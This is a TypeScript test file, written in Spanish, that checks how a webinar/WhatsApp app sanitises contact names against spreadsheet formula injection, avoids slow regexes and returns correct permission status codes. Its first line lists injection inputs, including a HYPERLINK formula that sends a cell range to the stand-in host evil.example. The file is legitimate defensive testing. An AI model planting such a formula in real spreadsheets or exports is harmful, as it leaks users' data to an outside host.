  '"=HYPERLINK(""https://evil.example/?d=""&B1:B500,""Ver"")"', '"=1+1"', '"@SUM(1+1)"', '"+1+1"', '"-2+3"', ' "=1+1"', '"abc',
];

/* ---------- R1. un nombre larguísimo no frena el servidor ---------- */

test("nombreSinFormula es lineal: una corrida larga de espacios, NBSP o U+2003 en el medio no la frena", () => {
  const limpiar = WA.nombreSinFormula;
  for (const blanco of [" ", " ", " "]) {
    const nombre = ("a" + blanco.repeat(40_000) + "b").trim();
    const t0 = performance.now();
    const r = limpiar(nombre);
    const ms = performance.now() - t0;
    assert.ok(ms < 250, `tardó ${Math.round(ms)} ms con ${JSON.stringify(blanco)} (antes, 3 s con 40.000)`);
    assert.ok(r && r.length <= 120);
  }
  /* Y el nombre que sólo termina en espacios largos. */
  const t1 = performance.now();
  limpiar("a" + " ".repeat(40_000));
  assert.ok(performance.now() - t1 < 250);
});

test("nombreSinFormula corta el nombre en 120 caracteres, sin partir un emoji", () => {
  const limpiar = WA.nombreSinFormula;
  assert.equal(WA.MAX_NOMBRE, 120);
  assert.equal(limpiar("a".repeat(500)), "a".repeat(120));
  assert.equal(limpiar("a".repeat(119) + "😀😀"), "a".repeat(119), "no queda media pareja de sustitutos");
  assert.equal(limpiar("a".repeat(119) + " " + "b".repeat(50)), "a".repeat(119), "ni un espacio al final del corte");
  assert.equal(limpiar("Ana Pérez"), "Ana Pérez");
});

/* ---------- R2 y R4a. la comilla ya no reactiva la fórmula ni junta renglones ---------- */

test("«Con nombres»: un nombre entre comillas no vuelve a ser fórmula al pegarlo en una planilla", () => {
  for (const nombre of NOMBRES_CON_COMILLAS) {
    const salida = listaParaCopiar([{ nombre, numero: "5491155551234", completo: true }], true);
    const celdas = pegarEnPlanilla(salida)[0];
    assert.equal(celdas.length, 2, `«${nombre}»: sigue siendo nombre y teléfono (${JSON.stringify(celdas)})`);
    assert.ok(!/^[=+\-@\t\r]/.test(celdas[0]), `«${nombre}» queda como texto, no como fórmula: ${celdas[0]}`);
    assert.equal(celdas[1], "+5491155551234");
    assert.ok(!celdas[0].includes('"'), "ni una comilla recta en la celda");
  }
});

test("el nombre que se guarda no lleva comillas rectas ni empieza con una fórmula, entre comillas o no", () => {
  for (const nombre of NOMBRES_CON_COMILLAS) {
    const r = WA.nombreSinFormula(nombre)!;
    assert.ok(!r.includes('"'), `«${nombre}» → «${r}»`);
    assert.ok(!/^[=+\-@\t\r]/.test(r), r);
    const celda = pegarEnPlanilla(listaParaCopiar([{ nombre: r, numero: "5491155551234", completo: true }], true))[0][0];
    assert.ok(!/^[=+\-@]/.test(celda), celda);
  }
  assert.equal(WA.nombreSinFormula('"=1+1"'), "”=1+1”");
});

test("una comilla sin cerrar no junta los renglones que siguen en una sola celda", () => {
  const filas = [
    { nombre: '"abc', numero: "5491155550001", completo: true },
    { nombre: "Ana", numero: "5491155550002", completo: true },
    { nombre: "Beto", numero: "5491155550003", completo: true },
  ];
  const pegado = pegarEnPlanilla(listaParaCopiar(filas, true));
  assert.equal(pegado.length, 3, "tres renglones copiados son tres filas");
  assert.deepEqual(pegado.map((f) => f[1]), ["+5491155550001", "+5491155550002", "+5491155550003"]);
});

/* ---------- R4b. U+0085, U+2028 y U+2029 son saltos de renglón ---------- */

test("U+0085, U+2028 y U+2029 en un nombre no parten el renglón: pasan a espacio", () => {
  for (const salto of ["\u0085", " ", " "]) {
    const nombre = `Ana${salto}Pérez`;
    const copiado = listaParaCopiar([{ nombre, numero: "5491155551234", completo: true }], true);
    assert.equal(copiado, "Ana Pérez\t+5491155551234", JSON.stringify(salto));
    assert.equal(WA.nombreSinFormula(nombre), "Ana Pérez");
    assert.equal(WA.nombreSinFormula(`${salto}=1+1`), "1+1", "ni delante de una fórmula");
  }
});

test("los nombres de verdad siguen igual, comillas tipográficas incluidas", () => {
  const nombres = ["Jean-Paul", "María", "O'Brien", "Ana “Anita” Pérez", "José María del Carmen", "李雷", "A+B"];
  for (const n of nombres) assert.equal(WA.nombreSinFormula(n), n);
  const filas = nombres.map((nombre, i) => ({ nombre, numero: `54911555500${i}`, completo: true }));
  assert.equal(listaParaCopiar(filas, true), filas.map((f) => `${f.nombre}\t+${f.numero}`).join("\n"));
});

/* ---------- R3. un error pasajero de permisos es 503, no 403 ---------- */

const PASAJERAS = FALLAS;

test("un error pasajero de la pregunta de permisos contesta 503 (no 403): ni la pantalla ni el aviso se dan por vencidos", async () => {
  for (const [nombre, f] of PASAJERAS) {
    const r = await pedirEstado({ ...DUENO, "nivel_area:webinars": f });
    assert.equal(r.status, 503, `nivel_area(webinars): ${nombre}`);
    assert.match(String(r.cuerpo.error), /No pudimos comprobar tu permiso, probá de nuevo/);
    assert.ok(!JSON.stringify(r.cuerpo).includes("base64"), "y el código no sale");
    const ajustes = await pedirEstado({ ...DUENO, "nivel_area:ajustes": f });
    assert.equal(ajustes.status, 503, `nivel_area(ajustes): ${nombre}`);
    assert.ok(!JSON.stringify(ajustes.cuerpo).includes("base64"), "el código no sale");
    const sinPedirCodigo = await pedirEstado({ ...DUENO, "nivel_area:webinars": f }, { query: "" });
    assert.equal(sinPedirCodigo.status, 503, `sin ?qr=1: ${nombre}`);
    const solo = await pedirEstado({ ...DUENO, solo_lo_suyo: f }, { query: "" });
    assert.equal(solo.status, 503, `solo_lo_suyo: ${nombre}`);
  }
  /* Quien edita Ajustes y no ve Webinars: si la segunda pregunta falla, 503 también. */
  const r = await pedirEstado({ ...DUENO, "nivel_area:webinars": 0, "nivel_area:ajustes": PASAJERAS[2][1] });
  assert.equal(r.status, 503);
});

test("puede_entrar con 429, 5xx o la red cortada es 503; que no sea del equipo o no tenga sesión sigue siendo 401", async () => {
  for (const [nombre, f] of PASAJERAS.filter(([n]) => !/JWT/.test(n))) {
    const pg = postgrest({ puede_entrar: f });
    try { assert.equal((await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["webinars"], 1)))?.status, 503, nombre); } finally { pg.restaurar(); }
  }
  const pg = postgrest({ puede_entrar: false });
  try { assert.equal((await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["webinars"], 1)))?.status, 401); } finally { pg.restaurar(); }
});

test("sin permiso de verdad sigue siendo 403 y con permiso, 200", async () => {
  assert.equal((await pedirEstado({ ...DUENO, "nivel_area:webinars": 0, "nivel_area:ajustes": 0 })).status, 403);
  assert.equal((await pedirEstado({ ...MARKETING, "nivel_area:webinars": 0, "nivel_area:ajustes": 0 }, { query: "" })).status, 403);
  assert.equal((await pedirEstado(DUENO)).status, 200);
  const pg = postgrest({ ...MARKETING, "nivel_area:webinars": PASAJERAS[2][1] });
  try {
    await conEquipo(async () => {
      assert.equal((await getWebinar(conSesion("http://localhost/api/whatsapp/webinar?id=w1"))).status, 503);
      assert.equal((await getEstado(conSesion("http://localhost/api/whatsapp/estado"))).status, 503);
    });
  } finally { pg.restaurar(); }
});

test("el cliente sólo da por «sin acceso» a un 401 o 403: con un 503 conserva lo que tenía y sigue preguntando", () => {
  assert.equal(WA.esSinAcceso(401), true);
  assert.equal(WA.esSinAcceso(403), true);
  for (const e of [0, 429, 500, 502, 503, 504]) assert.equal(WA.esSinAcceso(e), false, String(e));
  const cliente = readFileSync(new URL("../src/lib/whatsapp-cliente.ts", import.meta.url), "utf8");
  assert.ok(!/estado === 40[13]/.test(cliente), "ningún lugar decide el acceso por su cuenta");
  assert.equal(cliente.match(/esSinAcceso\(err\.estado\)/g)?.length, 3, "el lector compartido, el de Ajustes y el del grupo");
  /* Con un error no se vacía lo que había (sólo con sin acceso); el 503 sigue el ciclo normal de preguntas. */
  assert.match(cliente, /poner\(\{ cargando: false, datos: vista\.datos, error: err\.message, sinAcceso: esSinAcceso\(err\.estado\) \}\)/);
  assert.equal(WA.proximaPregunta(WA.esSinAcceso(503), false), 3_500, "vuelve a preguntar solo");
});

/* ---------- R5. C8 completo: las tablas whatsapp_* en LEEN y EDITAN ---------- */

test("las tablas del lector están en LEEN y EDITAN: las lee quien ve Webinars sin ser «sólo lo suyo», las escribe sólo el servidor", async () => {
  const P = await import("@/lib/permisos");
  for (const t of ["whatsapp_lector", "whatsapp_grupos", "whatsapp_miembros"]) {
    assert.deepEqual(P.LEEN[t], ["webinars"], t);
    assert.deepEqual(P.EDITAN[t], [], t);
    assert.equal(P.puedeLeer(porDefecto("closer"), t), false, `${t}: el closer no`);
    assert.equal(P.puedeLeer(acceso({ crm: "editar", webinars: "ver" }, true), t), false, `${t}: «sólo lo suyo» con Webinars en ver, no`);
    assert.equal(P.puedeLeer(porDefecto("admin"), t), false, `${t}: administración no ve Webinars`);
    assert.equal(P.puedeLeer(porDefecto("director"), t), true, `${t}: el director sí`);
    assert.equal(P.puedeLeer(porDefecto("marketing"), t), true, `${t}: marketing sí`);
    assert.equal(P.puedeLeer(porDefecto("dueno"), t), true, `${t}: el dueño sí`);
    assert.equal(P.puedeLeer(null, t), false);
    for (const tipo of ["dueno", "marketing", "director", "closer"]) assert.equal(P.puedeEditar(porDefecto(tipo), t), false, `${t}: nadie la escribe desde la app (${tipo})`);
  }
  assert.deepEqual(P.LEEN.whatsapp_qr, []);
  assert.deepEqual(P.EDITAN.whatsapp_qr, []);
  for (const tipo of ["dueno", "equipo", "marketing", "director", "closer"]) {
    assert.equal(P.puedeLeer(porDefecto(tipo), "whatsapp_qr"), false, `el código no lo lee nadie desde la app (${tipo})`);
    assert.equal(P.puedeEditar(porDefecto(tipo), "whatsapp_qr"), false);
  }
  /* Lo que ya andaba no cambia. */
  assert.equal(P.puedeLeer(porDefecto("closer"), "webinars"), true);
  assert.equal(P.puedeEditar(porDefecto("marketing"), "webinars"), true);
});

test("GET y POST /api/whatsapp/webinar fallan cerrados en la nube aunque falte configurar el equipo (hay clave de servicio, no hay NEXT_PUBLIC_SUPABASE_*)", async () => {
  const { spawnSync } = await import("node:child_process");
  const raiz = new URL("..", import.meta.url).pathname;
  const guion = `
    const { GET, POST } = await import("@/app/api/whatsapp/webinar/route");
    const g = await GET(new Request("http://localhost/api/whatsapp/webinar?id=w1"));
    const p = await POST(new Request("http://localhost/api/whatsapp/webinar", { method: "POST", body: "{}" }));
    console.log(JSON.stringify([g.status, p.status]));
  `;
  const env = { ...process.env, SUPABASE_URL: "http://127.0.0.1:9", SUPABASE_SERVICE_ROLE_KEY: "clave-de-servicio-de-mentira" } as NodeJS.ProcessEnv;
  delete env.NEXT_PUBLIC_SUPABASE_URL; delete env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
  const r = spawnSync(process.execPath, ["--import", "./pruebas/registrar.mjs", "--input-type=module", "-e", guion], { cwd: raiz, env, encoding: "utf8", timeout: 60_000 });
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(JSON.parse(r.stdout.trim().split("\n").pop()!), [401, 401], "sin sesión no se lee ni se escribe nada");
});

test("el email de la landing pública tiene tope de largo y su expresión no se cuelga con miles de puntos", async () => {
  /* La validación del email corre antes de tocar la base y con la ruta pública: un email gigante con muchos puntos tardaba segundos. */
  const { POST } = await import("@/app/api/webinar/registro/route");
  const pedido = (email: string) =>
    new Request("http://localhost/api/webinar/registro", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email }) });
  const t0 = performance.now();
  const r = await POST(pedido("a@" + ".".repeat(20_000) + " x"));
  const ms = performance.now() - t0;
  assert.equal(r.status, 400);
  assert.ok(ms < 500, `tardó ${Math.round(ms)} ms: la regex vuelve a ser cuadrática`);
  const largo = await POST(pedido("a".repeat(250) + "@mail.com"));
  assert.equal(largo.status, 400, "más de 254 caracteres no es un email");
});
